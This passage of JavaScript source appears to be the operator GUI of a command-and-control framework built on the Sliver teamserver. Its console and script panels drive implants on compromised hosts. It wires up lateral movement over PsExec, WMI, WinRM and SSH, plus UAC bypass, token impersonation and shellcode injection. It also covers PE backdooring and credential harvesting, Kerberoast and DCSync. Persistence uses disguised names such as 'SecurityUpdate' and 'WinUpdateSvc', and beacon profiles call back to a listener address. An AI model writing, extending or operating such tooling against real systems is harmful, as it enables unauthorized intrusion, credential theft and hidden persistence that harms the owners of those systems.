  if (!activeCtxAgent) return;
  const { kind, obj } = activeCtxAgent;
  if (kind !== 'session') return toast('info', 'Integrity check needs an interactive session (for a beacon, run getprivs in its console)');
  if (!(obj.os || '').toLowerCase().includes('windows')) return toast('info', 'Integrity levels are a Windows concept');
  toast('info', `Checking integrity of ${obj.hostname}...`);
  const r = await App().GetPrivs(obj.id).catch(() => null);
  if (!r || !r.integrity) return toast('err', 'getprivs failed (needs a live Windows session)');
  integrityMap[obj.id] = r.integrity;
  saveState();
  const label = integrityLabel(obj) || r.integrity;
  toast(isPrivileged(obj) ? 'ok' : 'info', `${obj.hostname}: ${label} integrity`);
  renderTable();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
});
document.getElementById('ctx-rename').addEventListener('click', async () => {
  if (!activeCtxAgent || activeCtxAgent.kind !== 'session') return;
  const n = await uiPrompt('New name:', activeCtxAgent.obj.name || ''); if (!n) return;
  await App().RenameSession(activeCtxAgent.obj.id, n)
    .then(() => toast('ok', 'Session renamed'))
    .catch(e => toast('err', 'Rename failed: ' + e));
  refreshAgents();
});
document.getElementById('ctx-kill').addEventListener('click', async () => {
  if (!activeCtxAgent) return;
  const { kind, obj } = activeCtxAgent;
  if (!(await uiConfirm(`Kill ${kind} on ${obj.hostname || obj.id}?`, { title: 'Kill agent', okLabel: 'Kill', danger: true }))) return;
  const call = kind === 'session' ? App().KillSession(obj.id) : App().KillBeacon(obj.id);
  await call
    .then(() => toast('ok', `Killed ${kind} ${obj.hostname || ''}`.trim()))
    .catch(e => toast('err', 'Kill failed: ' + e));
  refreshAgents();
});

// ── Interaction panel ──────────────────────────────────────────────────────
function openInteract(kind, obj) {
  const id = obj.id;
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind, obj };
  document.getElementById('empty-interact')?.remove();
  // Create tab
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>[${kind.slice(0,3)}] ${esc(obj.hostname||obj.id.slice(0,6))}</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Create panel
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  const promptStr = `${shortUser(obj.username)}@${obj.hostname||'?'} :>`;
  const helpText = kind === 'beacon'
    ? `[beacon] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[info] Interval: ${fmtDur(obj.interval)} | Jitter: ${fmtDur(obj.jitter)}\n` +
      `[info] Commands are queued and execute on next check-in.\n` +
      `[info] Type 'help' for available commands.\n`
    : `[session] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[info] Interactive session. Commands execute immediately.\n` +
      `[info] Type 'help' for available commands.\n`;
  panel.innerHTML = `
    <div class="console-script-bar" id="csb-${id}">
      <div class="csb-header">
        <div class="csb-title">
          <span class="csb-badge">SCRIPTS</span>
          <span class="csb-target">Pivot: ${esc(obj.hostname || obj.id.slice(0,8))} (${obj.os}/${obj.arch})</span>
        </div>
        <div class="csb-cats" id="csb-cats-${id}"></div>
        <button class="csb-toggle-btn" id="csb-toggle-${id}">Hide Scripts</button>
      </div>
      <div class="csb-body" id="csb-body-${id}">
        <div class="csb-grid" id="csb-recipes-${id}"></div>
        <div class="csb-card" id="csb-card-${id}" style="display:none">
          <div class="csb-card-header">
            <h4 id="csb-card-title-${id}"></h4>
            <p id="csb-card-desc-${id}"></p>
          </div>
          <div class="csb-form-grid" id="csb-form-${id}"></div>
          <div class="csb-actions">
            <button class="csb-btn csb-btn-preview" id="csb-btn-prev-${id}">Preview / Dry-Run</button>
            <button class="csb-btn csb-btn-exec" id="csb-btn-exec-${id}">Execute Recipe</button>
          </div>
        </div>
      </div>
    </div>
    <div class="console-out" id="cout-${id}"><span class="info">${esc(helpText)}</span></div>
    <div class="console-in"><span class="console-prompt">${esc(promptStr)} </span><input class="console-input" id="cinp-${id}" placeholder="type a command..." autocomplete="off"/></div>
  `;
  document.getElementById('interact-panels').appendChild(panel);
  // Wire input
  const inp = document.getElementById(`cinp-${id}`);
  const hist = []; let hIdx = -1;
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') { runAgentCmd(kind, id, inp, hist); hIdx = -1; }
    if (e.key === 'ArrowUp') { if (hIdx < hist.length-1) { hIdx++; inp.value = hist[hIdx]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hIdx > 0) { hIdx--; inp.value = hist[hIdx]; } else { hIdx=-1; inp.value=''; } e.preventDefault(); }
  });
  attachConsoleScriptManager(id, kind, obj);
  activateTab(id);
}

function attachConsoleScriptManager(id, kind, obj) {
  const catsEl = document.getElementById(`csb-cats-${id}`);
  const gridEl = document.getElementById(`csb-recipes-${id}`);
  const cardEl = document.getElementById(`csb-card-${id}`);
  const cardTitle = document.getElementById(`csb-card-title-${id}`);
  const cardDesc = document.getElementById(`csb-card-desc-${id}`);
  const formEl = document.getElementById(`csb-form-${id}`);
  const btnPrev = document.getElementById(`csb-btn-prev-${id}`);
  const btnExec = document.getElementById(`csb-btn-exec-${id}`);
  const toggleBtn = document.getElementById(`csb-toggle-${id}`);
  const csbBody = document.getElementById(`csb-body-${id}`);

  let activeCat = 'All';
  let activeScript = null;
  let allScriptList = [];

  toggleBtn?.addEventListener('click', () => {
    const isHidden = csbBody.style.display === 'none';
    csbBody.style.display = isHidden ? 'block' : 'none';
    toggleBtn.textContent = isHidden ? 'Hide Scripts' : 'Show Scripts';
  });

  App().ListScripts().then(scripts => {
    const targetOS = (obj.os || 'windows').toLowerCase();
    allScriptList = (scripts || []).filter(s => {
      if (!s.targetOS || s.targetOS === 'all') return true;
      return targetOS.includes(s.targetOS);
    });
    const cats = ['All'];
    allScriptList.forEach(s => { if (!cats.includes(s.category)) cats.push(s.category); });

    catsEl.innerHTML = cats.map(c => `<button class="csb-cat-tab ${c === 'All' ? 'active' : ''}" data-cat="${esc(c)}">${esc(c)}</button>`).join('');
    catsEl.querySelectorAll('.csb-cat-tab').forEach(tb => {
      tb.addEventListener('click', () => {
        catsEl.querySelectorAll('.csb-cat-tab').forEach(x => x.classList.remove('active'));
        tb.classList.add('active');
        activeCat = tb.dataset.cat;
        renderRecipes();
      });
    });

    renderRecipes();
  }).catch(() => {});

  function renderRecipes() {
    gridEl.innerHTML = '';
    const filtered = activeCat === 'All' ? allScriptList : allScriptList.filter(s => s.category === activeCat);
    filtered.forEach(s => {
      const btn = document.createElement('button');
      btn.className = `csb-recipe-btn ${activeScript && activeScript.method === s.method ? 'active' : ''}`;
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      btn.innerHTML = `<span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}`;
      btn.title = s.description;
      btn.addEventListener('click', () => selectRecipe(s));
      gridEl.appendChild(btn);
    });
  }

  function selectRecipe(s) {
    activeScript = s;
    renderRecipes();

    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    formEl.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
          inputHtml = `<select id="csb-f-${id}-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="csb-f-${id}-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:10.5px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formEl.appendChild(field);
      });
    } else {
      formEl.innerHTML = `<div style="color:var(--muted);font-size:11px;grid-column:1/-1">No extra parameters needed. Click Preview or Execute to run recipe on <b>${esc(obj.hostname || id.slice(0,8))}</b>.</div>`;
    }

    cardEl.style.display = 'block';
  }

  function getParams() {
    if (!activeScript) return {};
    const map = {};
    if (activeScript.params) {
      activeScript.params.forEach(p => {
        const el = document.getElementById(`csb-f-${id}-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  btnPrev?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnPrev.disabled = true;
    appendOut(id, `[*] Generating preview for recipe: ${activeScript.name}...`, 'pending');
    try {
      const pmap = getParams();
      const res = await App().ScriptPreview(id, activeScript.method, pmap);
      if (res.error) {
        appendOut(id, `[error] ${res.error}`, 'err');
      } else {
        appendOut(id, res.output, 'info');
      }
    } catch (e) {
      appendOut(id, `[error] ${e}`, 'err');
    }
    btnPrev.disabled = false;
  });

  btnExec?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnExec.disabled = true;
    const method = activeScript.method;
    const pmap = getParams();

    appendOut(id, `[*] Executing script recipe: ${activeScript.name}...`, 'cmd');
    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(id, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(id, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(id, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(id);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(id, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(id);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(id, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(id, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(id, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(id, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(id, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(id, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(id, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(id, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(id, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(id);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(id);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(id);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(id);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(id, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(id);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(id);
          break;
        default:
          result = { error: 'Unknown script: ' + method };
      }
    } catch (e) {
      result = { error: String(e) };
    }

    btnExec.disabled = false;
    if (result.error) {
      appendOut(id, `[error] ${result.error}${result.output ? '\n' + result.output : ''}`, 'err');
    } else {
      appendOut(id, result.output || '[+] Done', 'ok');
    }
  });
}

function activateTab(id) {
  document.querySelectorAll('.interact-tab').forEach(t => t.classList.toggle('active', t.dataset.tid === id));
  document.querySelectorAll('.interact-panel').forEach(p => p.classList.toggle('active', p.id === `ip-${id}`));
  // The tab already shows the hostname — the label shows only the extra detail
  // (user · os/arch) so the name isn't repeated twice in the bar.
  const t = openTabs[id], label = document.getElementById('interact-label');
  activeInteractId = (t && t.obj) ? id : null;   // only real agents have notes
  if (label) label.textContent = '';             // tab already shows the agent; no extra label
  document.getElementById(`cinp-${id}`)?.focus();
}
function closeTab(id) {
  const t = openTabs[id];
  // Tear down an interactive shell's tunnel + event listeners on close.
  if (t && t.kind === 'shell') {
    App().StopInteractiveShell(t.tid).catch(()=>{});
    if (window.runtime) { window.runtime.EventsOff(t.evtOut); window.runtime.EventsOff(t.evtClose); }
  }
  delete openTabs[id];
  document.querySelector(`.interact-tab[data-tid="${id}"]`)?.remove();
  document.getElementById(`ip-${id}`)?.remove();
  const first = document.querySelector('.interact-tab');
  if (first) activateTab(first.dataset.tid);
}

// ── Command execution ──────────────────────────────────────────────────────
const HELP_TEXT = `
Core commands (session & beacon):
  help                       Show this help
  info                       Show agent info
  clear                      Clear the console
  shell <cmd>                Run a command in the OS shell (raw text works too)
  shell -i  (or  pty)        Open a real-time interactive shell (session only)
  execute <path> [args]      Run a program directly (no shell wrapper)
  grep [-r] <pattern> <path> Search file contents on the target
  mount                      List mounted drives/filesystems
  memfiles [list|add|rm <fd>]  Anonymous in-memory files
  ssh <user>@<host>[:port] [-p <pass>] <cmd>   Run a command over SSH from the implant
  ps                         List processes
  ls [path]                  List files (uses current dir)
  cd <path>                  Change working directory
  pwd                        Show current directory
  download <remote> [local]  Download a file (2nd arg = local path, else dialog)
  upload <local> <remote>    Upload a local file to the target (or 'upload' for dialog)
  cat <remote>               Print a remote text file
  mkdir <path>               Create a directory
  rm <path>                  Remove a file/dir
  mv <src> <dst>             Move/rename a file
  cp <src> <dst>             Copy a file
  screenshot                 Capture the desktop
  netstat                    Network connections
  ifconfig                   Network interfaces
  env / getenv <name>        Environment variables
  setenv <K> <V>             Set an env var
  unsetenv <K>               Unset an env var
  reg query|read|write|read-hive ...   Windows registry (HKLM/HKCU/...)
  whoami                     Current token owner
  getprivs                   Token privileges (Windows)
  procdump <pid>             Dump process memory
  kill <pid>                 Terminate a remote process
  loot [add <file>|rm <id>]  Save a target file to the shared loot store / list

  chmod <path> <mode>        Change file mode (e.g. 0755)
  chown <path> <uid> <gid>   Change file owner

Privilege / execution (session only):
  getsystem <profile> [proc] Escalate to SYSTEM via an implant profile
  make-token <dom> <u> <p>   Create a token from credentials
  impersonate <user>         Impersonate a logged-on user
  rev2self                   Drop an impersonated token
  runas -u <u> [-p <p>] <prog> [args]   Run a program as another user
  migrate <pid> <profile>    Migrate the implant into another process
  execute-assembly <local.exe> [args]   Run a .NET assembly (path or dialog)
  execute-shellcode <local.bin> [pid]   Inject shellcode (path or dialog)
  sideload <local.dll> [args]           Sideload a DLL/.so (path or dialog)
  spawndll <local.dll> [args]           Reflectively load a DLL (path or dialog)
  extensions                            List installed + loaded extensions/BOFs
  ext <command> [args...]               Run an extension/BOF (e.g. ext sa-whoami)
  wasm [list|register <f> [name]|exec <name> [args]]   WASM extensions
  execute-windows [-t][-H][--ppid <pid>] <path> [args]  Execute w/ token/PPID spoof (Windows)
  ping                                  Round-trip liveness check (session)
  wg-forwarders / wg-list-socks         List active WireGuard forwarders / socks
  close                                 Gracefully close this session
  backdoor <remote_pe> <profile>        Backdoor an on-disk PE with an implant
  dllhijack <ref_dll> <target> <profile>  Plant a hijacking DLL
  msf <payload> <lhost> <lport>         Run a Metasploit payload in-process
  msf-inject <payload> <lhost> <lport> <pid>  Inject an msf payload into a PID

Pivoting / tunneling (session only):
  socks start <port>|stop|status
  portfwd add <lport> <rhost> <rport> | rm <lport> | list
  rportfwd add <bindport> <fwdhost> <fwdport> | rm <id> | list
  wg-portfwd add <lport> <rhost:port> | rm <id>   (WireGuard implants)
  wg-socks <port> | stop <id>                      (WireGuard implants)
  pivot  start tcp|pipe <bind> | stop <id> | list
  services [detail <name>|start <name>]   Windows services (list / inspect / start)

Beacon only:
  tasks                      Show the beacon task queue
  reconfig <interval> <jitter>   Change the beacon check-in interval (seconds)
  interactive                Open an interactive session from this beacon
  (all commands are queued and run on next check-in)

Scripts (session & beacon — auto-generate + deploy):
  spawn <os> <arch> <profile>                             Spawn new beacon on CURRENT host (no creds needed)
                                                          e.g. spawn windows x64 my-http-profile
                                                          e.g. spawn linux x64 my-mtls-profile
  spawn linux <user>@<host> [-p <pass>] <profile>         Generate + deploy to remote via SSH
  spawn windows <user>@<host> [-p <pass>] <profile>       Generate + deploy to remote via PsExec
  jump ssh <user>@<host> [-p <pass>] <profile>            Alias for remote spawn linux
  jump psexec <user>@<host> [-p <pass>] <profile>         Alias for remote spawn windows
  jump winrm <user>@<host> [-p <pass>] <cmd>              Execute via WinRM
  jump wmi <user>@<host> [-p <pass>] <cmd>                Execute via WMI
  privesc-check                  Enumerate privilege escalation vectors
  harvest                        Search for credentials, keys, tokens
  ad-enum                        Enumerate Active Directory (domain info, admins, SPNs)
  local-enum                     Local system enumeration (whoami, admins, AV, network)
  kerberoast                     Request TGS tickets for offline cracking
  persist cron <line>            Add cron persistence
  persist reg <name> <path>      Add registry Run key persistence
  persist schtask <name> <path>  Add scheduled task persistence
  persist service <name> <path>  Install as Windows service
  scan <subnet> [ports]          Port scan from implant (e.g. scan 192.168.50 22,445,3306)

  NOTE: Create profiles first in Profiles panel or Server console:
    profiles new --mtls 10.10.10.1:8443 --os windows --arch amd64 --beacon --name win-mtls
    profiles new --http 10.10.10.1:8080 --os linux --arch amd64 --beacon --name lin-http
`.trim();

// Split a command line into tokens, respecting single/double quotes so a quoted
// argument (e.g. execute cmd.exe /c "net user X /add && ...") stays one token.
function tok(s) {
  const out = [], re = /"([^"]*)"|'([^']*)'|(\S+)/g; let m;
  while ((m = re.exec(s)) !== null) out.push(m[1] !== undefined ? m[1] : (m[2] !== undefined ? m[2] : m[3]));
  return out;
}

async function runAgentCmd(kind, id, inp, hist) {
  const raw = inp.value.trim(); if (!raw) return;
  hist.unshift(raw); inp.value = '';
  appendOut(id, raw, 'cmd');
  inp.disabled = true;
  try {
    await dispatchCmd(kind, id, raw);
  } catch (e) {
    appendOut(id, `[error] ${e}`, 'err');
  } finally {
    inp.disabled = false; inp.focus();
  }
}

async function dispatchCmd(kind, id, raw) {
  const parts = tok(raw);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);
  const tab = openTabs[id] || {};

  // ── universal built-ins ──
  if (cmd === 'help') return appendOut(id, HELP_TEXT, 'info');
  if (cmd === 'clear') { const o = document.getElementById(`cout-${id}`); if (o) o.innerHTML = ''; return; }
  if (cmd === 'info') { const o = tab.obj; return appendOut(id, `ID: ${o.id}\nHost: ${o.hostname}\nUser: ${o.username}\nOS: ${o.os}/${o.arch}\nPID: ${o.pid}\nTransport: ${o.transport}\nRemote: ${o.remoteAddress}`, 'info'); }
  if (cmd === 'tasks' && kind === 'beacon') return showTasks(id);
  if ((cmd === 'shell' && (!args.length || args[0] === '-i')) || cmd === 'pty') {
    if (kind !== 'session') return appendOut(id, '[!] interactive shell requires a session (beacons are async). For a beacon use: shell <command>', 'err');
    return openInteractiveShell(id, tab.obj);
  }

  // ── beacons: queue command, then poll for the result (non-blocking) ──
  if (kind === 'beacon') {
    if (cmd === 'reconfig') {
      if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
      await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
      return appendOut(id, `[+] reconfigure queued — interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
    }
    if (cmd === 'interactive') {
      await App().InteractiveBeacon(id);
      return appendOut(id, '[+] interactive session requested — it will appear as a session on next check-in', 'ok');
    }
    const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
    const r = await App().ExecuteBeaconCommandAsync(id, shellCmd).catch(e => ({ error: String(e) }));
    if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
    if (r.status === 'completed') {
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    if (r.taskId) {
      appendOut(id, `[*] task ${r.taskId.slice(0,8)} queued — polling for result...`, 'pending');
      pollBeaconResult(id, r.taskId);
    } else {
      appendOut(id, '[*] command queued — waiting for beacon check-in', 'pending');
    }
    return;
  }

  // ── session commands ──
  switch (cmd) {
    case 'ps': {
      const procs = await App().GetProcessList(id);
      let out = 'PID     PPID    OWNER                EXECUTABLE\n';
      procs.forEach(p => { out += `${String(p.pid).padEnd(8)}${String(p.ppid).padEnd(8)}${(p.owner||'').slice(0,20).padEnd(21)}${p.executable||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'pwd': { const p = await App().PrintWorkingDir(id); tab.cwd = p; return appendOut(id, p, 'out'); }
    case 'cd': {
      if (!args[0]) return appendOut(id, 'usage: cd <path>', 'err');
      const p = await App().ChangeDir(id, args.join(' '));
      tab.cwd = p;
      return appendOut(id, p, 'out');
    }
    case 'ls': {
      const path = args[0] || tab.cwd || '.';
      const r = await App().ListFiles(id, path);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      tab.cwd = r.path || path;
      let out = `${tab.cwd}\n`;
      (r.files||[]).forEach(f => { out += `${f.isDir?'d':'-'} ${(f.mode||'').padEnd(11)} ${String(f.isDir?'':fmtSize(f.size)).padStart(9)}  ${f.name}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'download': {
      if (!args[0]) return appendOut(id, 'usage: download <remote> [local]   (no local path → save dialog)', 'err');
      // Two args = CLI style download to a specific local path; one arg = save dialog.
      const r = args.length >= 2
        ? await App().DownloadFileTo(id, args[0], args[1])
        : await App().DownloadFile(id, args[0]);
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] ${args[0]} -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'upload': {
      // upload <local> <remote> (CLI) | upload [remote] (open dialog for local)
      const r = args.length >= 2
        ? await App().UploadFileFrom(id, args[0], args[1])
        : await App().UploadFile(id, args[0] || '');
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] uploaded -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'screenshot': {
      appendOut(id, '[*] capturing...', 'pending');
      const dataUrl = await App().TakeScreenshot(id).catch(e => null);
      if (!dataUrl) return appendOut(id, '[error] screenshot failed', 'err');
      return appendImg(id, dataUrl);
    }
    case 'netstat': {
      const entries = await App().GetNetstat(id);
      let out = 'PROTO  LOCAL                 REMOTE                STATE        PID    PROCESS\n';
      entries.forEach(e => { out += `${(e.protocol||'').padEnd(7)}${(e.localAddr||'').padEnd(22)}${(e.remoteAddr||'').padEnd(22)}${(e.state||'').padEnd(13)}${String(e.pid||'').padEnd(7)}${e.process||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'env': {
      const vars = await App().GetEnvVars(id);
      return appendOut(id, vars.map(v => `${v.key}=${v.value}`).join('\n'), 'out');
    }
    case 'whoami': {
      const owner = await App().CurrentTokenOwner(id).catch(() => null);
      if (owner) return appendOut(id, owner, 'out');
      return dispatchCmd(kind, id, 'shell whoami');
    }
    case 'kill': case 'terminate': {
      if (!args[0]) return appendOut(id, `usage: ${cmd} <pid>`, 'err');
      await App().KillRemoteProcess(id, parseInt(args[0]));
      return appendOut(id, `[+] terminated PID ${args[0]}`, 'out');
    }
    case 'getsystem': {
      if (!args[0]) return appendOut(id, 'usage: getsystem <profile> [hosting_process]', 'err');
      const err = await App().GetSystem(id, args[1] || '', args[0]).then(() => null).catch(e => String(e));
      if (err) {
        if (err.includes('main.go') || err.includes('parse') || err.includes('IDENT')) {
          return appendOut(id, `[error] the teamserver failed to generate the shellcode implant for getsystem (server-side codegen error, not the GUI). This is a known Sliver server issue with shellcode/inject generation. Workaround: use the service-persistence method (sc create + a generated exe) to get SYSTEM, which you've already done successfully.`, 'err');
        }
        return appendOut(id, `[error] ${err}`, 'err');
      }
      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it — watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) — that returns a SYSTEM session directly.', 'info');
    }
    case 'make-token': {
      if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
      await App().MakeToken(id, args[1], args[0], args.slice(2).join(' '));
      return appendOut(id, '[+] token created', 'out');
    }
    case 'impersonate': {
      if (!args[0]) return appendOut(id, 'usage: impersonate <user>', 'err');
      await App().ImpersonateUser(id, args.join(' '));
      return appendOut(id, `[+] impersonating ${args.join(' ')}`, 'out');
    }
    case 'rev2self': { await App().RevToSelf(id); return appendOut(id, '[+] reverted to self', 'out'); }
    case 'execute-assembly': {
      // execute-assembly <local-path> [assembly args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().ExecuteAssembly(id, args[0] || '', args.slice(1).join(' '));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.output && r.output.trim()) return appendOut(id, r.output.trimEnd(), 'out');
      return appendOut(id, '[+] executed, but NO output was captured.\n    execute-assembly runs .NET/CLR assemblies ONLY. If this is a native binary\n    (e.g. mimikatz.exe), use: upload it then `execute`, or `sideload` the mimikatz DLL.', 'info');
    }
    case 'sideload': {
      // sideload <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
    }
    case 'socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'start') { await App().StartSocksProxy(id, parseInt(args[1])||1080); return appendOut(id, `[+] SOCKS5 on 127.0.0.1:${parseInt(args[1])||1080}`, 'out'); }
      if (sub === 'stop')  { await App().StopSocksProxy(id); return appendOut(id, '[+] SOCKS5 stopped', 'out'); }
      const p = await App().SocksProxyStatus(id);
      return appendOut(id, p ? `[*] SOCKS5 active on 127.0.0.1:${p}` : '[*] no SOCKS5 proxy running', 'info');
    }
    case 'portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().AddPortForward(id, parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] 127.0.0.1:${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm')  { await App().RemovePortForward(id, parseInt(args[1])); return appendOut(id, `[+] removed forward on :${args[1]}`, 'out'); }
      const fwds = await App().ListPortForwards(id);
      return appendOut(id, fwds.length ? fwds.map(f => `127.0.0.1:${f.localPort} -> ${f.remote}`).join('\n') : '[*] no port forwards', 'info');
    }
    case 'pivot': {
      const sub = (args[0]||'').toLowerCase();
